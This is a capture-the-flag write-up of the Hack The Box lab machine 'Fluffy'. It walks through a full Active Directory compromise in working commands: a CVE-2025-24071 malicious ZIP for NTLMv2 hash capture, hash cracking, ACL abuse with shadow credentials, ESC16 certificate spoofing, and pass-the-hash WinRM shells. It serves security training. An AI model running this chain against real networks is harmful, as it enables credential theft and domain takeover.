---
title: "Hack The Box: Fluffy"
date: 2025-10-31
summary: "An Easy Windows-based machine where the target is compromised by exploiting CVE-2025-24071 via a malicious ZIP uploaded to a writable SMB share, capturing and cracking an NTLMv2 hash. Group membership ACL abuse combined with Shadow Credentials yields initial WinRM access as a service account. Privileges are escalated by abusing the CA service account to exploit an AD CS ESC16 vulnerability through UPN spoofing, issuing an administrator certificate for domain takeover."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/Fluffy"
tags:
  - ace-genericall
  - ace-genericwrite
  - active-directory
  - bloodhound
  - bloodhound-ce-python
  - bloodyad
  - certipy-ad
  - cve-2025-24071
  - esc16
  - evil-winrm
  - hashcat
  - netexec
  - nmap
  - responder
  - smbclient
---

### Provided Information

"As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman`:`J0elTHEM4n1990!`"

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/fluffy 10.129.218.189
<SNIP>
Nmap scan report for fluffy.htb (10.129.218.189)
Host is up, received echo-reply ttl 127 (0.23s latency).
Scanned at 2025-10-31 10:57:14 +04 for 109s
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-31 13:57:19Z)
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
<SNIP>
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
<SNIP>
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
<SNIP>
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
<SNIP>
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21617/tcp): CLEAN (Timeout)
|   Check 2 (port 7865/tcp): CLEAN (Timeout)
|   Check 3 (port 59298/udp): CLEAN (Timeout)
|   Check 4 (port 18835/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 6h59m40s, deviation: 0s, median: 6h59m40s
| smb2-time: 
|   date: 2025-10-31T13:58:09
|_  start_date: N/A
<SNIP>
```

From the pattern of running services, it is almost guaranteed that the target is a Domain Controller (DC).

The FQDN of the DC is `dc01.fluffy.htb`.

Let’s focus on the most common paths of attack, starting with SMB.

But before that, let’s add the identified domain names to `/etc/hosts` file:

```bash
$ echo "10.129.218.189 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
```

### SMB Enumeration

Let’s enumerate SMB shares with `netexec` and the given credentials:

```bash
$ netexec smb 10.129.218.189 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.129.218.189  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.129.218.189  445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.218.189  445    DC01             [*] Enumerated shares
SMB         10.129.218.189  445    DC01             Share           Permissions     Remark
SMB         10.129.218.189  445    DC01             -----           -----------     ------
SMB         10.129.218.189  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.218.189  445    DC01             C$                              Default share
SMB         10.129.218.189  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.218.189  445    DC01             IT              READ,WRITE      
SMB         10.129.218.189  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.218.189  445    DC01             SYSVOL          READ            Logon server share
```

As seen, there is a non-default share called “IT”, and it is both readable and writeable with the given account.

So let’s try connecting to it using `smbclient` and listing its contents:

```bash
$ smbclient //10.129.218.189/IT -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct 31 18:07:02 2025
  ..                                  D        0  Fri Oct 31 18:07:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 19:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 19:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 19:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 19:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 18:31:07 2025
```

Many files exist alongside a directory, but one of the things that stand up is the “Upgrade_Notice.pdf” file. Its name suggests some required updates to the system/domain/machine, so let’s download it:

```bash
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (101.6 KiloBytes/sec) (average 101.6 KiloBytes/sec)
```

After opening the file, it is indeed an updates-related file:

![Figure 1](/assets/images/writeups/hack-the-box-fluffy/hack-the-box-fluffy-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Continuing reading the contents, there is a list of identified CVEs in the systems of the domain:

![Figure 2](/assets/images/writeups/hack-the-box-fluffy/hack-the-box-fluffy-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

Let’s see if any of the identified (and hopefully not yet patched) vulnerabilities can get us somewhere.

### Stealing NTLMv2 Hash Through CVE-2025-24071

CVE-2025-24071 is described by the [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-24071) as following:

> Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network.
> 

This could potentially lead to spoofing over authentication attempts happening within the AD domain.

Further lookup of this CVE leads into [this GitHub repository](https://github.com/0x6rss/CVE-2025-24071_PoC), explaining how we can exploit an SMB authentication flaw to steal a user’s NTLMv2 hash.

So let’s clone the repository and try using the provided Python file to get a user’s NTLMv2 hash:

```bash
$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC
Cloning into 'CVE-2025-24071_PoC'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (18/18), 6.30 KiB | 3.15 MiB/s, done.
Resolving deltas: 100% (4/4), done.

$ cd CVE-2025-24071_PoC

$ python3 poc.py
Enter your file name: fluffy
Enter IP (EX: 192.168.1.162): 10.10.14.36
completed

$ ls
exploit.zip  poc.py  README.md
```

Now let’s upload the generated ZIP file to the IT share, in hope that a user will attempt to extract its contents:

```bash
$ smbclient //10.129.218.189/IT -U 'j.fleischman%J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put exploit.zip 
putting file exploit.zip as \exploit.zip (0.6 kB/s) (average 0.6 kB/s)
```

Now to capture the (potential) NTLMv2 hash, let’s run `responder`:

```bash
$ sudo responder -I tun0 -v                                      
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.218.189
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:13943785124f16b1:92280BBEA125<REDACTED>
```

So the vulnerability is not yet patched, and a target user whose username is `p.agila` fell victim to the attack, successfully leading to the sniff of their account’s NTLMv2 hash.

Let’s try cracking the hash with `hashcat` using mode 5600 (NTLMv2) and `rockyou` wordlist:

```bash
$ echo 'p.agila::FLUFFY:13943785124f16b1:92280BBEA125<REDACTED>' > p.agila_hash

$ hashcat -m 5600 p.agila_hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
<SNIP>
p.agila::FLUFFY:13943785124f16b1:92280BBEA125<REDACTED>:prom<REDACTED>
                                                          
Session..........: hashcat
Status...........: Cracked
<SNIP>
```

So hashcat was able to successfully crack the hash, giving us an additional account to enumerate AD with.

### Bloodhound

Now that the new account is compromised, let’s use it to enumerate the domain with `bloodhound`.

First let’s collect data for `bloodhound` using `bloodhound-ce-python`:

```bash
$ bloodhound-ce-python -d fluffy.htb -u p.agila -p 'prom<REDACTED>' -ns 10.129.218.189 -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 39S
INFO: Compressing output into 20251031142002_bloodhound.zip

$ ls
20251031142002_bloodhound.zip
```

Now let’s run `bloodhound` and import the ZIP file into it:

```bash
$ sudo bloodhound
```

After importing the data, search for the compromised user “p.agila” and mark it as owned:

![Figure 3](/assets/images/writeups/hack-the-box-fluffy/hack-the-box-fluffy-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

From here, let’s see what outbound controls this user has:

![Figure 4](/assets/images/writeups/hack-the-box-fluffy/hack-the-box-fluffy-fig-5.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

So the user is part of the “Service Account Managers” group, which has GenericAll permission over “Service Accounts” group. This means that “p.agila” user has full control over the accounts that are part of “Service Accounts” group.

Let’s enumerate what accounts are part of this group:

![Figure 5](/assets/images/writeups/hack-the-box-fluffy/hack-the-box-fluffy-fig-6.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

Notice that “winrm_svc” account is part of this group. Further enumeration reveals the following:

![Figure 6](/assets/images/writeups/hack-the-box-fluffy/hack-the-box-fluffy-fig-7.png)

<figcaption class="blog-image-caption">Figure 6</figcaption>

“winrm_svc” is part of the “Remote Management Users” group. So this means that this user is able to WinRM into targets, which is part of our goal (gain RCE over the target).

So the attack path will be as following:

![Figure 7](/assets/images/writeups/hack-the-box-fluffy/hack-the-box-fluffy-fig-8.png)

<figcaption class="blog-image-caption">Figure 7</figcaption>

1. “p.agila” is already member of the “Service Account Managers” group, so no need to do anything in this step.
2. Let’s exploit the GenericAll permission to add the “p.agila” user to the “Service Accounts” group, using `bloodyAD`:
    
```bash
    $ bloodyAD -u 'p.agila' -p 'prom<REDACTED>' -d fluffy.htb --host 10.129.218.189 add groupMember 'service accounts' p.agila
    [+] p.agila added to service accounts
```
    
3. Now, as part of the “Service Accounts” group, let’s exploit the GenericWrite permission to add shadow credentials to the “winrm_svc” account to retrieve its RC4 hash, using `certipy-ad`:
    
```bash
    $ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prom<REDACTED>' -account winrm_svc
    Certipy v5.0.3 - by Oliver Lyak (ly4k)
    [*] Targeting user 'winrm_svc'
    <SNIP>
    [*] Successfully restored the old Key Credentials for 'winrm_svc'
    [*] NT hash for 'winrm_svc': 33bd09<REDACTED>
```
    
4. With access to the hash of the “winrm_svc” user, let’s use to gain RCE to the target through using `evil-winrm`, where the `user.txt` flag will be awaiting:
    
```bash
    $ evil-winrm -u 'winrm_svc' -H 33bd09<REDACTED> -i dc01.fluffy.htb
                                            
    Evil-WinRM shell v3.7
                                            
    Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
    fluffy\winrm_svc
    *Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
    *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls
    
        Directory: C:\Users\winrm_svc\Desktop
    
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -ar---       10/31/2025   4:47 AM             34 user.txt
    
    *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
    50a705<REDACTED>
```
    

As seen in figure 5 above, the “Service Accounts” group not only contains “winrm_svc” account but also “ldap_svc” and “ca_svc”. The “ca_svc” account in particular is interesting because it is the Certificate Authority account (given its name), which is an account used by Active Directory Certificate Services (AD CS) to operate.

This means that this user is likely our door to privilege escalation, as compromising it might lead to certificates compromise, thus privileges compromise.

First of all, let’s get its hash in the same way of getting the “winrm_svc” account’s hash:

```bash
$ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prom<REDACTED>' -account ca_svc
Certipy v5.0.3 - by Oliver Lyak (ly4k)
[*] Targeting user 'ca_svc'
 <SNIP>
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f<REDACTED>
```

Now with the hash of the “ca_svc” account in hand, let’s enumerate AD CS certificate templates/CA entries that are enabled and marked as “vulnerable”:

```bash
$ certipy-ad find -u 'ca_svc' -hashes ca0f4f<REDACTED> -dc-ip 10.129.218.189 -vulnerable -enabled -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
    CA Name                             : fluffy-DC01-CA
<SNIP>
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
<SNIP>
```

The output shows that the target is vulnerable to ESC16 attack, which, as [explained by the author of certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), can be used for privilege escalation.

> Attacker (`attacker@corp.local`) has `GenericWrite` permission over a "victim" account (`victim@corp.local`). The `victim` account can enroll in *any suitable client authentication template* (e.g., the default "User" template) on the ESC16-vulnerable CA. The target for impersonation is `administrator@corp.local`.
> 
1. Update the UPN (User Principal Name) of the “ca_svc” user to “administrator”:

```bash
$ certipy-ad account update -username p.agila@fluffy.htb -p 'prom<REDACTED>' -user ca_svc -upn 'administrator'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: All nameservers failed to answer the query FLUFFY.HTB. IN A: Server Do53:1.1.1.1@53 answered The DNS operation timed out.; Server Do53:1.0.0.1@53 answered SERVFAIL; Server Do53:1.1.1.1@53 answered SERVFAIL
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

1. Request a certificate as the “ca_svc” user, whose UPN became that of an administrator:

```bash
$ certipy-ad req -u ca_svc -hashes ca0f4f<REDACTED> -dc-ip 10.129.218.189 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template 'User'    
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

1. Revert the UPN of “ca_svc” account to its original value:

```bash
$ certipy-ad account update -username p.agila@fluffy.htb -p 'prom<REDACTED>' -user ca_svc -upn 'ca_svc@fluffy.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

1. Use the generated administrator certificate to gain the RC4 hash of the administrator account:

```bash
$ certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.218.189
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@fluffy.htb': 
aad3b435b51404eeaad3b435b51404ee:8da83a<REDACTED>
```

Now with the administrator’s hash in hands, let’s use `evil-winrm` to log into the target as administrator, where `root.txt` will be awaiting:

```bash
$ evil-winrm -u 'administrator' -H 8da83a<REDACTED> -i dc01.fluffy.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/31/2025   4:47 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
c6fa5e<REDACTED>
```
